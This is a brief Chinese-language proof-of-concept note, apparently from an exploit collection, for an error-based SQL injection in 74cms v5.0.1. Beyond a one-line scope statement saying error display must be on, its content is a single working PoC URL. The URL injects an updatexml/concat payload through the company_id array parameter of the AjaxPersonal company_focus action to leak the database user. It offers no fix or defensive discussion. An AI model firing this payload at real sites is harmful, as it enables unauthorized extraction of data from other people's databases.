# 74cms v5.0.1 前台sql注入
## 影响范围

74cms v5.0.1,需要把报错开启,因为是报错注入...

## poc

`127.0.0.1/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a`